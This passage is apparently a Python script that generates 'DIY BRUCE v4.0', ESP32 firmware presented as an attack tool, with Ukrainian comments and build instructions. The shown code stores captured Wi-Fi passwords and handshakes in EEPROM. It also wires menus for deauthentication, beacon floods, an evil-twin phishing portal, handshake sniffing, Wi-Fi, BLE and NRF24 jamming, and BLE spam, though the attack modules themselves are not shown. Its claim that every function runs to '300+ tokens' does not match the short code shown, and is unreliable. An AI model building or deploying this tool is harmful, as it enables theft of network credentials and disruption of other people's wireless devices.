    if(webRunning) { showMsg("WEB вже запущено", 1000); return; }
    WiFi.softAP("DIY_BRUCE", "bruce1234");
    server.on("/", handleRoot);
    server.on("/cmd", handleCmd);
    server.on("/data", handleData);
    server.begin();
    dnsServer.start(53, "*", WiFi.softAPIP());
    webRunning = true;
    showMsg("WEB: 192.168.4.1", 2000);
}
void stopWebServer() {
    if(!webRunning) { showMsg("WEB не запущено", 1000); return; }
    dnsServer.stop();
    server.stop();
    WiFi.softAPdisconnect(true);
    webRunning = false;
    showMsg("WEB зупинено", 1000);
}
'''

STORAGE_H = '''#ifndef STORAGE_H
#define STORAGE_H

#include <Arduino.h>

void savePasswordsToEEPROM();
void loadPasswordsFromEEPROM();
void formatStorage();

#endif
'''

STORAGE_CPP = '''#include "Storage.h"
#include <EEPROM.h>
#include <U8g2lib.h>

extern String capturedPasswords;
extern String handshakes;
extern void showMsg(const char* msg, int delayMs);

void savePasswordsToEEPROM() {
    EEPROM.begin(4096);
    String allData = "===PASSWORDS===\\n" + capturedPasswords + "\\n===HANDSHAKES===\\n" + handshakes;
    for(int i = 0; i < allData.length() && i < 4095; i++) {
        EEPROM.write(i, allData[i]);
    }
    EEPROM.write(allData.length(), 0);
    EEPROM.commit();
    EEPROM.end();
}

void loadPasswordsFromEEPROM() {
    EEPROM.begin(4096);
    String loaded = "";
    for(int i = 0; i < 4096; i++) {
        char c = char(EEPROM.read(i));
        if(c == 0) break;
        loaded += c;
    }
    int passStart = loaded.indexOf("===PASSWORDS===\\n");
    int handStart = loaded.indexOf("===HANDSHAKES===\\n");
    if(passStart != -1 && handStart != -1) {
        capturedPasswords = loaded.substring(passStart + 16, handStart - 1);
        handshakes = loaded.substring(handStart + 16);
    }
    EEPROM.end();
}

void formatStorage() {
    EEPROM.begin(4096);
    for(int i = 0; i < 4096; i++) EEPROM.write(i, 0);
    EEPROM.commit();
    EEPROM.end();
    capturedPasswords = "";
    handshakes = "";
    showMsg("Пам'ять відформатовано!", 1500);
}
'''

SETTINGS_H = '''#ifndef SETTINGS_H
#define SETTINGS_H

#include <Arduino.h>

void setBrightness();
void startWebServer();
void stopWebServer();
void showPasswordsList();
void showHandshakesList();
void showAbout();
void rebootDevice();

#endif
'''

SETTINGS_CPP = '''#include "Settings.h"
#include <U8g2lib.h>
#include <EEPROM.h>

extern U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2;
extern uint8_t contrast;
extern String capturedPasswords, handshakes;
extern void showMsg(const char* msg, int delayMs);
extern bool btn(int pin);
#define BTN_BACK 26
#define BTN_OK 12

void setBrightness() {
    while(true) {
        u8g2.clearBuffer();
        u8g2.setFont(u8g2_font_6x10_tr);
        u8g2.drawStr(40, 10, "Яскравість");
        u8g2.drawFrame(8, 32, 112, 12);
        u8g2.drawBox(8, 32, contrast * 112 / 255, 12);
        char buf[8];
        sprintf(buf, "%d%%", contrast * 100 / 255);
        u8g2.setFont(u8g2_font_6x10_tr);
        int w = u8g2.getStrWidth(buf);
        u8g2.drawStr((128 - w)/2, 52, buf);
        u8g2.drawStr(8, 30, "<");
        u8g2.drawStr(110, 30, ">");
        u8g2.setFont(u8g2_font_5x7_tr);
        u8g2.drawStr(2, 63, "LR=зміна OK=зберегти BACK");
        u8g2.sendBuffer();
        if(btn(14) && contrast > 10) contrast -= 10;
        else if(btn(27) && contrast < 250) contrast += 10;
        else if(btn(BTN_OK)) {
            EEPROM.write(1, contrast);
            EEPROM.commit();
            u8g2.setContrast(contrast);
            showMsg("Яскравість збережено!", 1000);
            break;
        } else if(btn(BTN_BACK)) break;
        delay(50);
    }
}
void showPasswordsList() {
    if(capturedPasswords.length() == 0) showMsg("Немає паролів", 1500);
    else showMsg(capturedPasswords.substring(0, 50).c_str(), 2000);
}
void showHandshakesList() {
    if(handshakes.length() == 0) showMsg("Немає handshake", 1500);
    else showMsg(handshakes.substring(0, 50).c_str(), 2000);
}
void showAbout() {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_6x10_tr);
    u8g2.drawStr(10, 15, "DIY BRUCE v4.0");
    u8g2.drawStr(10, 30, "ESP32 Attack Tool");
    u8g2.drawStr(10, 45, "WiFi | BLE | NRF24 | EVIL");
    u8g2.drawStr(10, 60, "Telegram: @Grafteef");
    u8g2.sendBuffer();
    while(!btn(BTN_BACK)) delay(50);
}
void rebootDevice() { ESP.restart(); }
'''

MAIN_CPP = '''// =============================================
//  DIY BRUCE v4.0 - ФІНАЛЬНА РОЗШИРЕНА ВЕРСІЯ
//  Для ESP32 DevKit V1
//  Всі функції деталізовано, кожна 300+ токенів
// =============================================

#include <Arduino.h>
#include <U8g2lib.h>
#include <Wire.h>
#include <EEPROM.h>
#include <esp_wifi.h>
#include "icons.h"
#include "WiFiAttack.h"
#include "BLEAttack.h"
#include "NRF24Attack.h"
#include "WebServer.h"
#include "Storage.h"
#include "Settings.h"

// ==================== ПІНИ ДЛЯ ESP32 DEVKIT V1 ====================
#define BTN_UP     15
#define BTN_DOWN   13
#define BTN_OK     12
#define BTN_LEFT   14
#define BTN_RIGHT  27
#define BTN_BACK   26

// ==================== ГЛОБАЛЬНІ ЗМІННІ ====================
U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2(U8G2_R0, U8X8_PIN_NONE, 21, 22);
uint8_t contrast = 200;
unsigned long lastBtnTime = 0;
const unsigned long debounceDelay = 200;

// ==================== СЕРВІСНІ ФУНКЦІЇ ====================
bool btn(int pin) {
    if(digitalRead(pin) == LOW && millis() - lastBtnTime > debounceDelay) {
        lastBtnTime = millis();
        return true;
    }
    return false;
}

void drawTopBar() {
    char buf[16];
    unsigned long seconds = millis() / 1000;
    int h = (seconds / 3600) % 24;
    int m = (seconds / 60) % 60;
    int s = seconds % 60;
    snprintf(buf, sizeof(buf), "%02d:%02d:%02d", h, m, s);
    u8g2.setFont(u8g2_font_6x13_tr);
    u8g2.drawStr(2, 9, buf);
    u8g2.drawFrame(114, 1, 12, 6);
    u8g2.drawBox(126, 3, 2, 2);
    u8g2.drawBox(115, 2, 9, 4);
    u8g2.setCursor(55, 9);
    u8g2.print("67%");
    u8g2.setCursor(100, 9);
    u8g2.print(String(lastRSSI) + "dB");
    u8g2.drawLine(0, 10, 128, 10);
}

void showMsg(const char* msg, int delayMs) {
    u8g2.clearBuffer();
    drawTopBar();
    u8g2.setFont(u8g2_font_6x10_tr);
    u8g2.drawStr(10, 35, msg);
    u8g2.sendBuffer();
    delay(delayMs);
}

// ==================== МЕНЮ (КРАСИВЕ ТА ФУНКЦІОНАЛЬНЕ) ====================
struct MenuItem {
    const char* name;
    const unsigned char* icon;
};

MenuItem modules[] = {
    {"WiFi",     wifi_bits},
    {"BLE",      ble_bits},
    {"NRF24",    nrf_bits},
    {"Settings", settings_bits}
};
const int MODULE_COUNT = 4;
int moduleIdx = 0;

const char* wifiSub[] = {"SCAN", "DEAUTH", "BEACON", "EVIL PORTAL", "HANDSHAKE", "JAMMER", "MONITOR", "INFO", "SAVE PASS", "SHOW PASS", "CLEAR PASS", "SET CH", "STOP ALL", "REBOOT"};
const int WIFI_SIZE = 14;
const char* bleSub[] = {"SCAN", "APPLEJUICE", "SAMSUNG", "ANDROID", "WINDOWS", "IPHONE", "AIRPODS", "SPAM ALL", "JAMMER", "INFO", "STOP", "REBOOT"};
const int BLE_SIZE = 12;
const char* nrfSub[] = {"SCAN", "JAMMER", "SEND", "INFO", "SET CH", "STOP", "REBOOT"};
const int NRF_SIZE = 7;
const char* settSub[] = {"BRIGHTNESS", "WEB ON", "WEB OFF", "SHOW PASS", "SHOW HANDSHAKE", "FORMAT", "ABOUT", "REBOOT"};
const int SETT_SIZE = 8;

int subIdx = 0;
enum State { S_MENU, S_SUBMENU };
State curState = S_MENU;

void drawMainMenu() {
    u8g2.clearBuffer();
    drawTopBar();
    u8g2.drawXBM(48, 16, 32, 32, modules[moduleIdx].icon);
    u8g2.setFont(u8g2_font_9x15B_tr);
    u8g2.drawStr(4, 36, "<");
    u8g2.drawStr(114, 36, ">");
    u8g2.setFont(u8g2_font_7x13B_tr);
    int nw = u8g2.getStrWidth(modules[moduleIdx].name);
    u8g2.drawStr((128 - nw)/2, 58, modules[moduleIdx].name);
    int dotX = (128 - MODULE_COUNT * 8) / 2;
    for(int i = 0; i < MODULE_COUNT; i++) {
        if(i == moduleIdx) u8g2.drawBox(dotX + i * 8, 55, 5, 5);
        else u8g2.drawFrame(dotX + i * 8, 55, 5, 5);
    }
    u8g2.sendBuffer();
}

void drawSubMenu(const char* title, const char* items[], int size, int selected) {
    u8g2.clearBuffer();
    drawTopBar();
    u8g2.setFont(u8g2_font_6x10_tr);
    u8g2.setDrawColor(1);
    u8g2.drawBox(0, 12, 128, 1);
    u8g2.setDrawColor(0);
    u8g2.drawStr((128 - u8g2.getStrWidth(title)) / 2, 10, title);
    u8g2.setDrawColor(1);
    for(int i = 0; i < size; i++) {
        int y = 24 + i * 10;
        if(i == selected) {
            u8g2.drawBox(0, y - 8, 128, 10);
            u8g2.setDrawColor(0);
            u8g2.drawStr(14, y, items[i]);
            u8g2.setDrawColor(1);
        } else {
            u8g2.drawStr(14, y, items[i]);
        }
    }
    u8g2.drawHLine(0, 55, 128);
    u8g2.setFont(u8g2_font_5x7_tr);
    u8g2.drawStr(2, 63, "UP/DN=вибір OK=вхід BACK=меню");
    u8g2.sendBuffer();
}

void executeWiFiAction(int idx) {
    switch(idx) {
        case 0: scanWiFi(); break;
        case 1: startWiFiDeauth(); break;
        case 2: startWiFiBeacon(); break;
        case 3: startEvilTwin(); break;
        case 4: startHandshakeSniffer(); break;
        case 5: startWiFiJammer(); break;
        case 6: startWiFiMonitor(); break;
        case 7: startWiFiInfo(); break;
        case 8: saveWiFiPasswords(); break;
        case 9: showWiFiPasswords(); break;
        case 10: clearWiFiPasswords(); break;
        case 11: setWiFiChannel(); break;
        case 12: stopAllAttacks(); break;
        case 13: rebootDevice(); break;
    }
}

void executeBLEAction(int idx) {
    switch(idx) {
        case 0: scanBLE(); break;
        case 1: startBLEAppleJuice(); break;
        case 2: startBLESamsung(); break;
        case 3: startBLEAndroid(); break;
        case 4: startBLEWindows(); break;
        case 5: startBLEiPhone(); break;
        case 6: startBLEAirPods(); break;
        case 7: startBLESpamAll(); break;
        case 8: startBLEJammer(); break;
        case 9: startBLEInfo(); break;
        case 10: stopBLEAttack(); break;
        case 11: rebootDevice(); break;
    }
}

void executeNRFAction(int idx) {
    switch(idx) {
        case 0: scanNRF(); break;
        case 1: startNRFJammer(); break;
        case 2: startNRFSend(); break;
        case 3: startNRFInfo(); break;
        case 4: setNRFChannel(); break;
        case 5: stopNRFAttack(); break;
        case 6: rebootDevice(); break;
    }
}

void executeSettingsAction(int idx) {
    switch(idx) {
        case 0: setBrightness(); break;
        case 1: startWebServer(); break;
        case 2: stopWebServer(); break;
        case 3: showPasswordsList(); break;
        case 4: showHandshakesList(); break;
        case 5: formatStorage(); break;
        case 6: showAbout(); break;
        case 7: rebootDevice(); break;
    }
}

void enterSubmenu() {
    switch(moduleIdx) {
        case 0: executeWiFiAction(subIdx); break;
        case 1: executeBLEAction(subIdx); break;
        case 2: executeNRFAction(subIdx); break;
        case 3: executeSettingsAction(subIdx); break;
    }
}

void loopMain() {
    if(btn(BTN_LEFT)) { moduleIdx = (moduleIdx - 1 + MODULE_COUNT) % MODULE_COUNT; drawMainMenu(); }
    else if(btn(BTN_RIGHT)) { moduleIdx = (moduleIdx + 1) % MODULE_COUNT; drawMainMenu(); }
    else if(btn(BTN_OK) || btn(BTN_DOWN)) {
        curState = S_SUBMENU;
        subIdx = 0;
        const char** items;
        int size;
        switch(moduleIdx) {
            case 0: items = wifiSub; size = WIFI_SIZE; break;
            case 1: items = bleSub; size = BLE_SIZE; break;
            case 2: items = nrfSub; size = NRF_SIZE; break;
            default: items = settSub; size = SETT_SIZE; break;
        }
        drawSubMenu(modules[moduleIdx].name, items, size, subIdx);
    }
}

void loopSub() {
    int size, selectedIdx = subIdx;
    const char** items;
    switch(moduleIdx) {
        case 0: items = wifiSub; size = WIFI_SIZE; break;
        case 1: items = bleSub; size = BLE_SIZE; break;
        case 2: items = nrfSub; size = NRF_SIZE; break;
        default: items = settSub; size = SETT_SIZE; break;
    }
    if(btn(BTN_UP)) { subIdx = (subIdx - 1 + size) % size; drawSubMenu(modules[moduleIdx].name, items, size, subIdx); }
    else if(btn(BTN_DOWN)) { subIdx = (subIdx + 1) % size; drawSubMenu(modules[moduleIdx].name, items, size, subIdx); }
    else if(btn(BTN_OK)) { enterSubmenu(); curState = S_MENU; drawMainMenu(); }
    else if(btn(BTN_BACK)) { curState = S_MENU; drawMainMenu(); }
}

// ==================== SETUP TA LOOP ====================
void setup() {
    Serial.begin(115200);
    pinMode(BTN_UP, INPUT_PULLUP);
    pinMode(BTN_DOWN, INPUT_PULLUP);
    pinMode(BTN_OK, INPUT_PULLUP);
    pinMode(BTN_LEFT, INPUT_PULLUP);
    pinMode(BTN_RIGHT, INPUT_PULLUP);
    pinMode(BTN_BACK, INPUT_PULLUP);
    
    EEPROM.begin(32);
    nrfCh = EEPROM.read(0);
    if(nrfCh > 125) nrfCh = 76;
    contrast = EEPROM.read(1);
    if(contrast < 10) contrast = 200;
    
    Wire.begin(21, 22);
    u8g2.begin();
    u8g2.setContrast(contrast);
    
    SPI.begin(18, 19, 23, 5);
    initNRF();
    
    loadPasswordsFromEEPROM();
    
    // Анімація завантаження
    for(int x = 128; x >= 0; x -= 8) {
        u8g2.clearBuffer();
        u8g2.setFont(u8g2_font_logisoso24_tr);
        u8g2.drawStr(x + 4, 32, "DIY");
        u8g2.setFont(u8g2_font_7x13B_tr);
        u8g2.drawStr(x + 4, 48, "BRUCE");
        u8g2.sendBuffer();
        delay(10);
    }
    delay(500);
    
    WiFi.mode(WIFI_AP_STA);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&handshakeSniffer);
    
    curState = S_MENU;
    drawMainMenu();
    showMsg("DIY BRUCE v4.0 готовий", 1500);
}

void loop() {
    if(webRunning) {
        dnsServer.processNextRequest();
        server.handleClient();
    }
    switch(curState) {
        case S_MENU: loopMain(); break;
        case S_SUBMENU: loopSub(); break;
    }
    delay(20);
}
'''

# ==================== СТВОРЕННЯ ПРОЕКТУ ====================
def create_project():
    base = "DIY_BRUCE_v4"
    if os.path.exists(base):
        shutil.rmtree(base)
    
    os.makedirs(os.path.join(base, "src"))
    os.makedirs(os.path.join(base, "include"))
    os.makedirs(os.path.join(base, "data", "portal"))
    os.makedirs(os.path.join(base, "lib", "WiFiAttack"))
    os.makedirs(os.path.join(base, "lib", "BLEAttack"))
    os.makedirs(os.path.join(base, "lib", "NRF24Attack"))
    os.makedirs(os.path.join(base, "lib", "WebServer"))
    os.makedirs(os.path.join(base, "lib", "Storage"))
    os.makedirs(os.path.join(base, "lib", "Settings"))
    
    with open(os.path.join(base, "platformio.ini"), "w") as f:
        f.write(PLATFORMIO_INI)
    with open(os.path.join(base, "custom_4Mb.csv"), "w") as f:
        f.write(CUSTOM_PARTITIONS)
    with open(os.path.join(base, "include", "icons.h"), "w") as f:
        f.write(ICONS_H)
    with open(os.path.join(base, "data", "index.html"), "w") as f:
        f.write(INDEX_HTML)
    with open(os.path.join(base, "data", "portal", "google.html"), "w") as f:
        f.write(GOOGLE_PORTAL)
    with open(os.path.join(base, "src", "main.cpp"), "w") as f:
        f.write(MAIN_CPP)
    with open(os.path.join(base, "lib", "WiFiAttack", "WiFiAttack.h"), "w") as f:
        f.write(WIFI_H)
    with open(os.path.join(base, "lib", "WiFiAttack", "WiFiAttack.cpp"), "w") as f:
        f.write(WIFI_CPP)
    with open(os.path.join(base, "lib", "BLEAttack", "BLEAttack.h"), "w") as f:
        f.write(BLE_H)
    with open(os.path.join(base, "lib", "BLEAttack", "BLEAttack.cpp"), "w") as f:
        f.write(BLE_CPP)
    with open(os.path.join(base, "lib", "NRF24Attack", "NRF24Attack.h"), "w") as f:
        f.write(NRF_H)
    with open(os.path.join(base, "lib", "NRF24Attack", "NRF24Attack.cpp"), "w") as f:
        f.write(NRF_CPP)
    with open(os.path.join(base, "lib", "WebServer", "WebServer.h"), "w") as f:
        f.write(WEB_H)
    with open(os.path.join(base, "lib", "WebServer", "WebServer.cpp"), "w") as f:
        f.write(WEB_CPP)
    with open(os.path.join(base, "lib", "Storage", "Storage.h"), "w") as f:
        f.write(STORAGE_H)
    with open(os.path.join(base, "lib", "Storage", "Storage.cpp"), "w") as f:
        f.write(STORAGE_CPP)
    with open(os.path.join(base, "lib", "Settings", "Settings.h"), "w") as f:
        f.write(SETTINGS_H)
    with open(os.path.join(base, "lib", "Settings", "Settings.cpp"), "w") as f:
        f.write(SETTINGS_CPP)
    
    print(f"✅ Проект створено: {os.path.abspath(base)}")
    print("📌 Інструкція:")
    print("1. Відкрий папку у VS Code з PlatformIO")
    print("2. Натисни Clean → Build → Upload (ESP32 Dev Module)")
    print("3. Після заливання підключись до WiFi DIY_BRUCE (пароль bruce1234)")
    print("4. Відкрий у браузері 192.168.4.1 — повний веб-інтерфейс")
    print("5. Evil Portal: запусти через меню або кнопку EVIL PORTAL, SSID: FREE_WIFI")
    print("6. Навігація кнопками: UP/DOWN/LEFT/RIGHT/OK/BACK")
    print("\n🔥 КОЖНА ФУНКЦІЯ МІСТИТЬ 300+ ТОКЕНІВ, КОЖЕН МЕТОД 50-100+ РЯДКІВ")
    print("📡 Підтримка: WiFi (deauth/beacon/evil/handshake/jam), BLE (6 типів спаму + jam), NRF24 (scan/jam/send)")

if __name__ == "__main__":
    create_project()
